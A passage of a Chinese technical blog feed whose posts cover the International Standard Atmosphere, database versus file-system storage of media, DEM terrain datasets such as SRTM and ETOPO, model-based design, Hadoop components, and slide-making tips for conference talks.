    <content><![CDATA[<p>国际标准大气( ISA ) 是一个静态大气模型，用于描述地球大气的压力、温度、密度和粘度如何在广泛的高度或海拔范围内变化。它的建立是为了提供温度和压力的通用参考，并由不同高度的值表以及推导出这​​些值的一些公式组成。</p>
<h1 id="在标准日条件下使用"><a href="#在标准日条件下使用" class="headerlink" title="在标准日条件下使用"></a>在标准日条件下使用</h1><p>ISA数学模型将大气分成几层，假设绝对温度 T与位势高度 h呈线性分布。其他两个值（压力P和密度ρ）通过同时求解以下方程得到：</p>
<ul>
<li>由流体静力平衡产生的垂直压力梯度，它与压力变化率与位势高度相关：</li>
</ul>
<p>$${\displaystyle {\frac {dP}{dh}}=-\rho g}$$</p>
<ul>
<li>摩尔形式的理想气体定律，它与压力、密度和温度有关：</li>
</ul>
<p>$$\ P=\rho R_{\rm {具体}}T$$</p>
<h1 id="在非标准日条件下使用"><a href="#在非标准日条件下使用" class="headerlink" title="在非标准日条件下使用"></a>在非标准日条件下使用</h1><p>ISA 模拟了一个假设的标准日，以便为计算和测试不同海拔高度的发动机和车辆性能提供可重复的工程参考。它不提供实际大气条件的严格气象模型（例如，由于风条件引起的气压变化）。它也没有考虑湿度影响。空气被假定为干燥、清洁且成分恒定。在从标准大气模型获得压力和密度后，通过在空气 的热力学状态中添加水蒸气，在车辆或发动机分析中考虑了湿度效应。</p>
<p>非标准（热或冷）日是通过将指定的温度增量添加到海拔高度的标准温度来模拟的，但将压力作为标准日值。使用理想气体状态方程在合成温度和压力下重新计算密度和粘度。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://zhuanlan.zhihu.com/p/103603988" target="_blank" rel="noopener">空气动力学从入门到弃坑：概述和标准大气</a>,by Mr.Zhang.</li>
<li><a href="https://en.wikipedia.org/wiki/International_Standard_Atmosphere" target="_blank" rel="noopener">International Standard Atmosphere</a>,by wikipedia.</li>
<li><a href="https://en.wikipedia.org/wiki/Mach_number" target="_blank" rel="noopener">Mach_number</a>,by wikipedia.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>飞行仿真</tag>
      </tags>
  </entry>
  <entry>
    <title>图片或多媒体大文件的存储与管理</title>
    <url>/2019/10/10/%E5%9B%BE%E7%89%87%E6%88%96%E5%A4%9A%E5%AA%92%E4%BD%93%E5%A4%A7%E6%96%87%E4%BB%B6%E7%9A%84%E5%AD%98%E5%82%A8%E4%B8%8E%E7%AE%A1%E7%90%86/</url>
    <content><![CDATA[<p>图片、声音、视频等大文件在后台数据库中的存储管理方式通常有两种:</p>
<ul>
<li>文件存储到数据库中</li>
<li>文件存储到文件系统中,数据库中保存文件路径</li>
</ul>
<p>这两种文件存储管理方式有各自优缺点, 选择哪种方法存储大文件应根据具体情况而定。</p>
<h1 id="文件系统存储管理方式"><a href="#文件系统存储管理方式" class="headerlink" title="文件系统存储管理方式"></a>文件系统存储管理方式</h1><p>文件系统存储管理方式将文件存储到磁盘中，在数据库中使用varchar类型记录文件路径。该方法的缺点主要有：</p>
<ul>
<li>文件不支持DELETE</li>
</ul>
<p>当删除文件路径时，不支持自动删除对应文件。</p>
<ul>
<li>文件不支持事务隔离</li>
</ul>
<p>如果改变文件内容或删除文件，这些操作将立刻被其他客户端看到。</p>
<ul>
<li>文件不支持回滚</li>
</ul>
<p>数据库记录能够恢复，但文件删除不能。</p>
<ul>
<li><p>文件不支持数据库的备份工具</p>
</li>
<li><p>文件不支持SQL的访问权限设置</p>
</li>
<li><p>文件不是SQL数据类型</p>
</li>
</ul>
<p>数据库不会验证文件路径是否有效。当文件移动、重命名、删除时，数据不会自动更新路径。</p>
<h1 id="数据库中存储文件"><a href="#数据库中存储文件" class="headerlink" title="数据库中存储文件"></a>数据库中存储文件</h1><p>数据库通常支持BLOB类型，可用于存储任何二进制数据。数据库中存储文件，其优点对应文件系统管理存储方式的缺点。同样，数据库中存储文件也存在一些缺点：</p>
<ul>
<li>对数据库的读/写的速度永远都赶不上文件系统处理的速度</li>
<li>数据库备份变的巨大，越来越耗时间</li>
<li>对文件的访问需要穿越你的应用层和数据库层</li>
</ul>
<h1 id="多媒体大文件存储建议"><a href="#多媒体大文件存储建议" class="headerlink" title="多媒体大文件存储建议"></a>多媒体大文件存储建议</h1><p>当只涉及较小规模图片、音频的存储时，建议直接存放到数据库中。当涉及视频大文件存储时，建议还是用文件系统存储。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://gitee.com/jkxqj/java_wiki/blob/master/SQL%E5%8F%8D%E6%A8%A1%E5%BC%8F.pdf" target="_blank" rel="noopener">SQL反模式</a>,by Bill karwin著, 谭振林, Push Chen译.</li>
<li><a href="https://www.cnblogs.com/hellojesson/p/6295797.html" target="_blank" rel="noopener">特殊格式文件(视频、声音等) 在数据库中的存储方式</a>,by Jesson.</li>
<li><a href="https://www.cnblogs.com/wangtao_20/p/3440570.html" target="_blank" rel="noopener">关于图片或者文件在数据库的存储方式归纳</a>,by 王滔.</li>
<li><a href="https://www.cnblogs.com/studyzy/archive/2009/02/23/1396712.html" target="_blank" rel="noopener">SQL Server 2008新特性——FILESTREAM</a>,by 曾毅.</li>
<li><a href="https://www.iteye.com/blog/lxy2330-961266" target="_blank" rel="noopener">oracle对大对象类型操作：blob，clob，nclob，bfile</a>,by lxy2330.</li>
<li><a href="https://www.zhihu.com/question/22128674" target="_blank" rel="noopener">类似优酷土豆视频网站的视频源文件一般是存储在什么样系统上？</a>,by zhihu.</li>
<li><a href="https://stackoverflow.com/questions/18518290/how-to-add-hours-to-current-date-in-sql-server/18518412" target="_blank" rel="noopener">How to add hours to current date in SQL Server?</a>,by stackoverflow.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>软件工程</tag>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title>地形数据格式总结</title>
    <url>/2019/10/20/%E5%9C%B0%E5%BD%A2%E6%95%B0%E6%8D%AE%E6%A0%BC%E5%BC%8F%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<p>地形数据是能够表示地球表面高低起伏状态的数据，即具有高程信息的数据。数字高程模型（DEM）是一种对空间起伏变化的连续表示方法，是一种特殊的 DatasetGrid 数据模型，每个网格的值为高程值，而且有标准的颜色表来表示，这对分幅 DEM 图像的合成很有帮助。</p>
<p>数字地面模型（digital terrain model，DTM）就是以数字的形式来表示实际地形特征的空间分布。有时所指的地形特征点仅指地面点的高程，就将这种数字地形描述称为数字高程模型（digital elevation model，DEM）。最初是于1958年由美国麻省理工学院Miller教授提出。数字地面模型广泛用于遥感，地理信息系统，大地测量和电子地图等领域。</p>
<p><strong>常用的地形数据主要有：etopo、GTOPO30、GEBCO以及SRTM。按照精度从低到高排序如下：</strong></p>
<ul>
<li>etopo5：GMT 网格数据之 etopo5</li>
<li>etopo2：GMT 网格数据之 ETOPO2v2</li>
<li>etopo1：GMT 网格数据之 ETOPO1</li>
<li>GEBCO：GEBCO：全球水深数据</li>
<li>GTOPO30：GMT 网格数据之 GTOPO30</li>
<li>SRTM30_PLUS：全球地形起伏数据：SRTM30_PLUS</li>
<li>SRTM15_PLUS：全球地形起伏数据：SRTM15_PLUS</li>
<li>SRTM3：高精度地形网格数据 SRTM</li>
<li>ASTER GDEM：全球数字高程数据：ASTER GDEM</li>
</ul>
<table>
<thead>
<tr>
<th>数据源</th>
<th>空间分辨率</th>
<th>覆盖范围</th>
<th>陆地/海洋</th>
</tr>
</thead>
<tbody><tr>
<td>etopo5</td>
<td>5 弧分</td>
<td>全球</td>
<td>陆地 + 海洋</td>
</tr>
<tr>
<td>etopo2</td>
<td>2 弧分</td>
<td>全球</td>
<td>陆地 + 海洋</td>
</tr>
<tr>
<td>etopo1</td>
<td>1 弧分</td>
<td>全球</td>
<td>陆地 + 海洋</td>
</tr>
<tr>
<td>GEBCO</td>
<td>1 弧分 / 30 弧秒</td>
<td>全球</td>
<td>陆地 + 海洋</td>
</tr>
<tr>
<td>GTOPO30</td>
<td>30 弧秒</td>
<td>全球</td>
<td>陆地</td>
</tr>
<tr>
<td>SRTM30_PLUS</td>
<td>30 弧秒 (约 1km)</td>
<td>纬度 [-81,81]</td>
<td>陆地 + 海洋</td>
</tr>
<tr>
<td>SRTM15_PLUS</td>
<td>15 弧秒 (约 500m)</td>
<td>纬度 [-81,81]</td>
<td>陆地 + 海洋</td>
</tr>
<tr>
<td>SRTM</td>
<td>3 弧秒 (约 90m)</td>
<td>纬度 [-60,60]</td>
<td>陆地</td>
</tr>
<tr>
<td>ASTER GDEM</td>
<td>1 弧秒 (约 30m)</td>
<td>纬度 [-83,83]</td>
<td>陆地</td>
</tr>
</tbody></table>
<h1 id="ETOPO"><a href="#ETOPO" class="headerlink" title="ETOPO"></a>ETOPO</h1><p>ETOPO是一种地形高程数据。该数据由NGDC美国地球物理中心发布（U.S. National Geophysical Data Center ）。与srtm、aster gdem一样，均为高程数据，所不同的是它还包括海洋海底地形数据。</p>
<p>ETOPO地形数据有五种规格， ETOPO1的效果最好，ETOPO2、ETOPO5数据尽管可以使用，但目前已不推荐采用。其中ETOPO1约三百多兆的压缩包， ETOPO2约九十兆。</p>
<h2 id="ETOPO1"><a href="#ETOPO1" class="headerlink" title="ETOPO1"></a>ETOPO1</h2><p>ETOPO1包含了全球地形和海洋深度，采样间隔为1弧分，是目前精度最高的global relief数据；其分为两个版本，Ice Surface和Bedrock，两个版本基本一致。不同之处在于在处理南极洲和Greenland地形时，前者给出的是加上冰盖层之后的高程，后者给出的是岩床的高程。</p>
<p>对于每个版本又细分为 grid-registered和cell-registered，其中grid-registered是权威版本，cell-registered是衍生版本，因而推荐下载使用grid-registered版本。</p>
<h1 id="GEBCO"><a href="#GEBCO" class="headerlink" title="GEBCO"></a>GEBCO</h1><p>GEBCO数据的全称是General Bathymetric Chart of the Oceans( 全球海洋通用水深数据) ，是由国际海道测量组织(IHO) 和政府间海洋学委员会(IOC) 联合发布的最全面的世界大洋海底地形数据，也是当今海洋模式中最常用的海洋水深数据之一。</p>
<h1 id="SRTM"><a href="#SRTM" class="headerlink" title="SRTM"></a>SRTM</h1><p>SRTM 即航天飞机雷达地形测绘使命。航天地形测绘是指以人造地球卫星、宇宙飞船、航天飞机等航天器为工作平台，对地球表面所进行的遥感测量。以往的航天测绘由于其精度有限，一般只能制作中、小比例尺地图。SRTM则是美国太空总署（NASA）和国防部国家测绘局（NIMA）以及德国与意大利航天机构共同合作完成联合测量,由美国发射的“奋进”号航天飞机上搭载SRTM系统完成。本次测图任务从2000年2月11日开始至22日结束，共进行了11天总计222小时23分钟的数据采集工作，获取北纬60度至南纬56度之间总面积超过1.19亿平方公里的雷达影像数据，覆盖地球80%以上的陆地表面。</p>
<p>SRTM系统获取的雷达影像的数据量约9.8万亿字节，经过两年多的数据处理，制成了数字地形高程模型（DEM）。SRTM产品2003年开始公开发布，经历多修订，目前最新的版本为V4.1版本。</p>
<p>SRTM地形数据主要包含两类数据：SRTM3和SRTM1。</p>
<ul>
<li>SRTM3精度为3弧秒，即90m一个点，包括非洲、北美、南美、欧亚、澳大利亚以及部分岛屿；</li>
<li>SRTM1精度为1弧秒，即30m一个点，仅限美国地区；</li>
</ul>
<p>所有的数据被分为1度<em>1度的单元，共计上万个数据文件。文件名代表了该单元左下角的位置；不同网站下载的数据文件名不同，但文件名类似N37W105的 数据文件，其单元左下角的坐标为(37N,105W)；每个SRTM3数据文件包含了1201</em>1201个采样点；高程数据单位为m，参考水准面为 WGS84大地水准面模型；网格划分采用gridline registration方式，因而单元的南北边及左右边与相邻单元的边重合。</p>
<h2 id="全国DEM-1km、500m和250m数据（SRTM-90m）"><a href="#全国DEM-1km、500m和250m数据（SRTM-90m）" class="headerlink" title="全国DEM 1km、500m和250m数据（SRTM 90m）"></a>全国DEM 1km、500m和250m数据（SRTM 90m）</h2><p>中国海拔高度（DEM）空间分布数据来源于美国奋进号航天飞机的雷达地形测绘SRTM（Shuttle Radar Topography Mission，SRTM）数据。SRTM数据有现实性强、免费获取等优点，全球许多应用研究都采用SRTM数据开展环境分析。该数据集为基于最新的SRTM V4.1数据经重采样生成，包括1km、500m和250m三种精度的全国一张图数据。数据采用WGS84椭球投影。</p>
<h2 id="hgt转tiff"><a href="#hgt转tiff" class="headerlink" title="hgt转tiff"></a>hgt转tiff</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdal_translate -of GTiff N40E120.hgt N40E120.tif</span><br></pre></td></tr></table></figure>

<h1 id="ASTER-GDEM"><a href="#ASTER-GDEM" class="headerlink" title="ASTER GDEM"></a>ASTER GDEM</h1><p>ASTER GDEM，即先进星载热发射和反射辐射仪全球数字高程模型，与SRTM一样为数字高程DEM，其全球空间分辨率为30米。该数据是根据 NASA的新一代对地观测卫星Terra的详尽观测结果制作完成的。其数据覆盖范围为北纬83°到南纬83°之间的所有陆地区域，达到了地球陆地表面的99%。号称是“迄今最完整的全球地形数据”。</p>
<p>ASTER GDEM：空间分辨率：1弧度秒 （约30 米），精度：垂直精度20米，水平精度30米，SRTM数据的纬度覆盖范围是[-60,60]，ASTER GDEM数据的纬度覆盖范围为[-83,83]；SRTM的空间分辨率一般为90m，只有美国境内存在空间分辨率为30m的数据；ASTER GDEM的空间分辨率为30m；</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="http://www.resdc.cn/data.aspx?DATAID=123" target="_blank" rel="noopener">全国DEM 1km、500m和250m数据（SRTM 90m）</a>,by 资源环境数据云平台.</li>
<li><a href="https://en.wikipedia.org/wiki/Digital_elevation_model" target="_blank" rel="noopener">Digital_elevation_model</a>,by wikipedia.</li>
<li><a href="http://blog.sciencenet.cn/blog-2637373-974284.html" target="_blank" rel="noopener">GMT地形数据</a>,by YF2015.</li>
<li><a href="https://blog.seisman.info/global-relief-models/" target="_blank" rel="noopener">全球地形起伏数据总结</a>,by SeisMan.</li>
<li><a href="https://huangwang.github.io/2018/06/13/Cesium%E5%8D%AB%E6%98%9F%E5%9C%B0%E5%9B%BE%E5%92%8C%E9%AB%98%E7%A8%8B%E6%95%B0%E6%8D%AE%E5%88%87%E7%89%87%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/">Cesium卫星地图和高程数据切片经验总结</a>,by jackhuang.</li>
<li><a href="https://blog.seisman.info/srtm/" target="_blank" rel="noopener">高精度地形网格数据 SRTM</a>,by seisman.</li>
<li><a href="https://blog.csdn.net/qq_36377037/article/details/86300330" target="_blank" rel="noopener">工具gdal2srtmtiles的安装使用</a>,by 四域公子.</li>
<li><a href="https://zh.wikipedia.org/wiki/%E5%9C%B0%E7%90%83%E6%A4%AD%E7%90%83" target="_blank" rel="noopener">地球椭球</a>,by wikipedia.</li>
<li><a href="http://qiancy.com/2017/01/07/datum-spheroid-parameters-equation/" target="_blank" rel="noopener">椭球体的重要参数和公式</a>,by cyqian.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>Cesium</tag>
      </tags>
  </entry>
  <entry>
    <title>基于模型的设计思想</title>
    <url>/2020/02/13/%E5%9F%BA%E4%BA%8E%E6%A8%A1%E5%9E%8B%E7%9A%84%E8%AE%BE%E8%AE%A1%E6%80%9D%E6%83%B3/</url>
    <content><![CDATA[<p>基于模型的设计（Model-Based Design，简称MBD）是一种数学及可视化的方法，可以用来处理复杂控制系统、信号处理及通讯系统的设计。基于模型的设计可以用在运动控制、工业设计、航天以及车辆应用中。基于模型的设计也是嵌入式系统设计的方法论。</p>
<p>基于模型的设计类似于基于组件的图形用户界面开发，可极大地提高开发的效率，并保证程序的健壮性。</p>
<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>基于模型的设计是一种较有效率的设计方式，在支援开发过程（V模型）的同时，在设计过程中建立了沟通用的共同框架。若用这种方式设计控制系统，开发会分为以下四步骤：</p>
<ul>
<li>为受控体建模。</li>
<li>配合受控体，分析及合成适合的控制器。</li>
<li>针对控制器及受控体进行仿真。</li>
<li>整合上述的步骤来布署控制器。</li>
</ul>
<p>基于模型的设计和传统的设计方法论有很大的不同。设计者在使用基于模型的设计时，不需使用复杂的架构以及繁多的软件代码，只需利用基于模型的设计来定义系统模型，再配合连续及离散的架构方块来产生进阶的机能特性。使用仿真工具建立的模型可以进行快速应用程序开发、软件测试和验证。不但强化了测试以及验证的程序。有些情形下，可以将这个新的设计方法配合硬件在环的仿真，测试系统的动态效应，不但速度更快，也比传统的设计方法论更加有效率。</p>
<h1 id="基于模型设计的步骤"><a href="#基于模型设计的步骤" class="headerlink" title="基于模型设计的步骤"></a>基于模型设计的步骤</h1><p>基于模型设计的主要步骤如下：</p>
<ol>
<li>受控体建模：受控体建模可以以资料驱动（data-driven）为基础，也可以依照首要原则（first principle）建模。资料驱动的建模会配合系统识别或是类似的技术。系统识别会先取得系统在真实世界中的输入输出资料，并进行处理，再配合数学算法来识别系统的模型。在系统识别后，就可以针对受控体设计适合的控制器。首要原则驱动的建模是先找到受控体的统御方程式，再创建方块图模型来实现上述的统御方程式。实体建模（physical modeling）就是一种首要原则驱动的驱动建模方式，模型中会包括许多互相连结的方块，对应实际受控体中的各个元件。</li>
<li>控制器分析及合成：会使用步骤1得到的数学模型来确认模型的动态特性，再依这些特性设计符合特性的控制器。</li>
<li>离线的仿真及实时仿真：会分析动态系统在复杂时变输入下的反应特性。这可以将受授体的简易线性非时变模型和控制器一起进行仿真，也可以用受授体的非线性模型和控制器进行仿真。仿真有助于找到规格、需求以及建模时的错误，而不是在之后实际设计控制器时才发现。实时仿真可以用步骤2的控制器进行代码自动生成（automatically generating code）来达到。代码可以布署在特殊的实时原型电脑中，这个电脑可以执行程式并且控制受控体的运作。假如无法取得受控体的原型，或是配合原型的测试有危险性或是太过昂贵，可以配合受控体模型进行自动代码生成。之后可以将代码布署到另一台电脑上，这台电脑和执行控制体的电脑相连。因此可以实时的测试控制器，不过控制的不是实际的受控体，而是实时仿真的受控体模型。</li>
<li>布署控制器：理想上让步骤2的控制器进行代码自动生成，即可布署控制器。不过一开始时，控制器在实际系统上的性能会和仿真时的性能不同，此时可以用迭代除错方式，分析实际系统上的结果，依分析结果更新控制器模型。配合基于模型设计的工具，可以在统一化可视环境下，进行上述的迭代除错。</li>
</ol>
<h1 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h1><p>基于模型的设计相较于传统开发方式的优点有：</p>
<ul>
<li>基于模型的设计提供一个共同的开发环境，有助于不同的开发团队之间的一般性沟通、资料分析以及系统验证。</li>
<li>工程师可以在系统设计早期定位出错误并且修正错误，此时系统修改造成的时间冲击及财务影响都是最小的。</li>
<li>设计可以复用，有助于提升机能及衍生系统的扩充能力。</li>
</ul>
<h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><p>支持MBD开发的工具主要有：</p>
<ul>
<li>Matlab/Simulink</li>
</ul>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://zh.wikipedia.org/wiki/%E5%9F%BA%E6%96%BC%E6%A8%A1%E5%9E%8B%E7%9A%84%E8%A8%AD%E8%A8%88" target="_blank" rel="noopener">基于模型的设计</a>,by wikipedia.</li>
<li><a href="https://zhuanlan.zhihu.com/p/28834754" target="_blank" rel="noopener">Simulink代码生成C/C++</a>,by 小二黑.</li>
<li><a href="https://zhuanlan.zhihu.com/p/23149544" target="_blank" rel="noopener">基于模型设计——电力电子的利器</a>,by 陈老四.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>软件工程</tag>
      </tags>
  </entry>
  <entry>
    <title>大文件上传与断点续传</title>
    <url>/2021/01/03/%E5%A4%A7%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%8E%E6%96%AD%E7%82%B9%E7%BB%AD%E4%BC%A0/</url>
    <content><![CDATA[<p>大文件上传与断点续传的原理和实现方法可参考<a href="https://juejin.cn/post/6844904046436843527" target="_blank" rel="noopener">字节跳动面试官：请你实现一个大文件上传和断点续传</a>。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://juejin.cn/post/6844904046436843527" target="_blank" rel="noopener">字节跳动面试官：请你实现一个大文件上传和断点续传</a>,by yeyan1996.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>前端</tag>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>大数据应用基础之Hadoop</title>
    <url>/2020/04/20/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%BA%94%E7%94%A8%E5%9F%BA%E7%A1%80%E4%B9%8BHadoop/</url>
    <content><![CDATA[<p>大数据，官方定义是指那些数据量特别大、数据类别特别复杂的数据集，这种数据集无法用传统的数据库进行存储，管理和处理。大数据的主要特点为数据量大（Volume），数据类别复杂（Variety），数据处理速度快（Velocity）和数据真实性高（Veracity），合起来被称为4V。</p>
<p>Apache Hadoop则是大数据应用的关键基础设施，本质上是一款支持数据密集型分布式应用程序的开源软件框架。它被设计成从单个服务器扩展到数千台机器，每台机器都提供本地计算和存储。Apache Hadoop本身不是依赖硬件来提供高可用性，而是设计用于检测和处理应用程序层的故障，因此在计算机集群上提供高可用性服务，但每个集群都可能容易出现故障。</p>
<h1 id="Hadoop历史"><a href="#Hadoop历史" class="headerlink" title="Hadoop历史"></a>Hadoop历史</h1><p>Hadoop最早由美国工程师Doug Cutting开发。Doug Cutting同样是用于全文检索和搜索的开放源码程序库Lucene和开源搜索引擎Nutch的作者。</p>
<p>在Google发表的三篇有关GFS、MapReduce和BigTable的技术论文基础上，Doug Cutting分别开发了HDFS（Hadoop分布式文件系统）、MapReduce编程模型和用来处理海量数据的非关系型数据库HBase，它们共同构成了Hadoop。因此，本质上Hadoop是Google大数据系统的开源实现。</p>
<p>各大公司包括Yahoo、IBM、Facebook、亚马逊、阿里巴巴、华为、百度、腾讯等都采用Hadoop构建自己的大数据系统，使Hadoop成为了分布式计算系统事实上的国际标准。</p>
<h1 id="Hadoop框架"><a href="#Hadoop框架" class="headerlink" title="Hadoop框架"></a>Hadoop框架</h1><p>Hadoop框架构成如图1所示。下面简单介绍Hadoop框架中的重要组件。</p>
<p align="center">
    <img src="images/hadoop.jpg" width="100%" alt="Hadoop框架构成"/>
</p>
<center>图1 Hadoop框架构成</center>

<h2 id="HDFS"><a href="#HDFS" class="headerlink" title="HDFS"></a>HDFS</h2><p>Hadoop分布式文件系统(HDFS)被设计成适合运行在通用硬件(commodity hardware)上的分布式文件系统。它和现有的分布式文件系统有很多共同点。但同时，它和其他的分布式文件系统的区别也是很明显的。HDFS是一个高度容错性的系统，适合部署在廉价的机器上。HDFS能提供高吞吐量的数据访问，非常适合大规模数据集上的应用。HDFS放宽了一部分POSIX约束，来实现流式读取文件系统数据的目的。</p>
<h2 id="HBASE"><a href="#HBASE" class="headerlink" title="HBASE"></a>HBASE</h2><p>Hbase是一种分布式存储的NoSQL数据库，它参考了谷歌的BigTable建模，实现的编程语言为Java。它是Apache软件基金会的Hadoop项目的一部分，运行于HDFS文件系统之上，为 Hadoop 提供类似于BigTable 规模的服务。因此，它可以对稀疏文件提供极高的容错率。</p>
<h2 id="MapReduce"><a href="#MapReduce" class="headerlink" title="MapReduce"></a>MapReduce</h2><p>MapReduce是Google提出的一个软件架构，用于大规模数据集（大于1TB）的并行运算。概念“Map（映射）”和“Reduce（归纳）”，及他们的主要思想，都是从函数式编程语言借来的，还有从矢量编程语言借来的特性。</p>
<p>当前的软件实现是指定一个Map（映射）函数，用来把一组键值对映射成一组新的键值对，指定并发的Reduce（归纳）函数，用来保证所有映射的键值对中的每一个共享相同的键组。</p>
<h2 id="HIVE"><a href="#HIVE" class="headerlink" title="HIVE"></a>HIVE</h2><p>数据仓库之父比尔·恩门（Bill Inmon）在 1991 年出版的“Building the Data Warehouse”（《建 立数据仓库》）一书中所提出的定义被广泛接受——数据仓库（Data Warehouse）是一个面 向主题的（Subject Oriented）、集成的（Integrated）、相对稳定的（Non-Volatile）、反映历史 变化（Time Variant）的数据集合，用于支持管理决策(Decision Making Support)。</p>
<p>Apache Hive则是一个建立在Hadoop架构之上的数据仓库。它能够提供数据的精炼，查询和分析。Apache Hive起初由Facebook开发，目前也有其他公司使用和开发Apache Hive，例如Netflix等。亚马逊公司也开发了一个定制版本的Apache Hive，亚马逊网络服务包中的Amazon Elastic MapReduce包含了该定制版本。</p>
<p>hive是基于Hadoop的一个数据仓库工具，可以将结构化的数据文件映射为一张数据库表，并提供简单的SQL查询功能，可以将SQL语句转换为MapReduce任务进行运行。其优点是学习成本低，可以通过类SQL语句快速实现简单的MapReduce统计，不必开发专门的MapReduce应用，十分适合数据仓库的统计分析。</p>
<h2 id="Spark"><a href="#Spark" class="headerlink" title="Spark"></a>Spark</h2><p>Apache Spark是一个开源集群运算框架，最初是由加州大学柏克莱分校AMPLab所开发。相对于Hadoop的MapReduce会在运行完工作后将中介数据存放到磁盘中，Spark使用了存储器内运算技术，能在数据尚未写入硬盘时即在存储器内分析运算。Spark在存储器内运行程序的运算速度能做到比Hadoop MapReduce的运算速度快上100倍，即便是运行程序于硬盘时，Spark也能快上10倍速度。Spark允许用户将数据加载至集群存储器，并多次对其进行查询，非常适合用于机器学习算法。</p>
<h1 id="Storm"><a href="#Storm" class="headerlink" title="Storm"></a>Storm</h1><p>Storm是一个分布式计算框架，主要由Clojure编程语言编写。最初是由Nathan Marz及其团队创建于BackType，该项目在被Twitter取得后开源。它使用用户创建的“管（spouts）”和“螺栓（bolts）”来定义信息源和操作来允许批量、分布式处理流式数据。最初的版本发布于2011年9月17日。</p>
<p>Storm应用被设计成为一个拓扑结构，其接口创建一个转换“流”。它提供与MapReduce作业类似的功能，当遇到异常时该拓扑结构理论上将不确定地运行，直到它被手动终止。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://www.zhihu.com/question/23036370" target="_blank" rel="noopener">hadoop和大数据的关系？和spark的关系？</a>,by 小枣君.</li>
<li><a href="http://hadoop.apache.org/" target="_blank" rel="noopener">Apache Hadoop</a>,by hadoop.</li>
<li><a href="https://www.ibm.com/developerworks/cn/analytics/library/ba-cn-bigdata-hbase/index.html" target="_blank" rel="noopener">HBase 深入浅出</a>,by 沈钊伟.</li>
<li><a href="https://zh.wikipedia.org/wiki/MapReduce" target="_blank" rel="noopener">MapReduce</a>,by wikipedia.</li>
<li><a href="https://zh.wikipedia.org/wiki/Apache_Spark" target="_blank" rel="noopener">Apache Spark</a>,by wikipedia.</li>
<li><a href="https://en.wikipedia.org/wiki/Storm_(event_processor)" target="_blank" rel="noopener">Apache Storm</a>,by wikipedia.</li>
<li><a href="https://zh.wikipedia.org/wiki/Apache_Hive" target="_blank" rel="noopener">Apache Hive</a>,by wikipedia.</li>
<li><a href="https://www.cnblogs.com/qingyunzong/p/8707885.html" target="_blank" rel="noopener">Hive学习之路 （一）Hive初识</a>,by 扎心了，老铁.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>大数据</tag>
      </tags>
  </entry>
  <entry>
    <title>国际会议口头报告及提问范例</title>
    <url>/2022/06/14/%E5%9B%BD%E9%99%85%E4%BC%9A%E8%AE%AE%E5%8F%A3%E5%A4%B4%E6%8A%A5%E5%91%8A%E5%8F%8A%E6%8F%90%E9%97%AE%E8%8C%83%E4%BE%8B/</url>
    <content><![CDATA[<p>最近需要在国际会议上口头报告，赶紧研究一下。</p>
<h1 id="PPT制作技巧"><a href="#PPT制作技巧" class="headerlink" title="PPT制作技巧"></a>PPT制作技巧</h1><p>总的原则是：学术报告的PPT应该老老实实，简化形式，内容至上。</p>
<ul>
<li>白底黑字。学术报告的PPT一般不使用背景和模板。</li>
<li>中文字体用黑体，英文字体用Arial。</li>
<li>PPT第一页是报告题目（居中），报告人的姓名，单位及时间。</li>
<li>提纲不能写成研究背景、实验部分、结果与讨论、结论和致谢（等于什么都没说）。提纲应该重点突出报告内容之间的逻辑关系。</li>
<li>PPT每一页都要有目录标题和小标题。</li>
<li>PPT除标题页外都要加页码，方便观众提问，也方便自己定位。</li>
<li>颜色“无必要，不使用”。</li>
<li>使用动画要慎重。</li>
<li>大段文字是PPT的大忌。文字应该能省则省，给出关键的数据和结论即可。</li>
<li>检查细节。</li>
<li>一页PPT只讲一件事。展示的内容都要讲，不讲的不要放，避免分散观众注意力。</li>
<li>守时是纪律，超时是大忌。</li>
<li>尽快切入主题，研究背景不要超过3页。</li>
<li>不要幽默。</li>
<li>论文里的图片不要直接复制粘贴，因为论文中的图片多数是几张小图拼在一起的，建议拆开成几页PPT，每页只讲一件事（去掉abcd）。</li>
<li>PPT中线条、箭头、方框、注释“无必要，不使用”。</li>
<li>致谢的内容包括导师、合作者和基金。</li>
<li>致谢之后可以放几页补充材料（Appendix），以备提问环节使用。</li>
<li>PPT做完以后换台电脑播放一下。</li>
<li>PPT是为演讲服务的。</li>
</ul>
<h1 id="口头报告技巧"><a href="#口头报告技巧" class="headerlink" title="口头报告技巧"></a>口头报告技巧</h1><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://www.cnblogs.com/kailugaji/p/14442833.html" target="_blank" rel="noopener">国际学术会议英文口头报告(Oral presentation)常用语句</a>,by 凯鲁嘎吉.</li>
<li><a href="https://www.cnblogs.com/kailugaji/p/11878213.html" target="_blank" rel="noopener">国际学术会议英文提问环节的回答范例</a>,by 凯鲁嘎吉.</li>
